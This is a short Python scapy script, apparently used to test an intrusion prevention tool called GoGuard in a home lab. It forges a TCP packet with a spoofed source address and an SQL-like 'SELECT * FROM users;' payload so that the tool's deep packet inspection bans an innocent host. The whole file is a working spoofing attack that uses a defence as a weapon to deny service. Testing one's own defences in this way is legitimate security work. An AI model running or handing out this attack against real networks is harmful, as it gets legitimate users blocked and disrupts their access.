from scapy.all import IP, TCP, Raw, send

# CONFIGURATION
# The IP you want to TRICK GoGuard into banning (e.g., your Windows Host)
victim_ip = "192.168.56.1"   
target_ip = "192.168.56.102" # Your Ubuntu VM
target_port = 80

print(f"--- Launching Direct Spoofing Attack ---")
print(f"Goal: Force GoGuard to ban {victim_ip} using a DPI Trigger")

# Construct a single packet with the full 'SELECT' keyword
# Source is faked as the Victim
packet = IP(src=victim_ip, dst=target_ip) / \
         TCP(sport=443, dport=target_port, flags="PA") / \
         Raw(load="SELECT * FROM users;")

# Send the packet
send(packet)

print(f"Packet sent! Check the GoGuard Console for a BAN on {victim_ip}")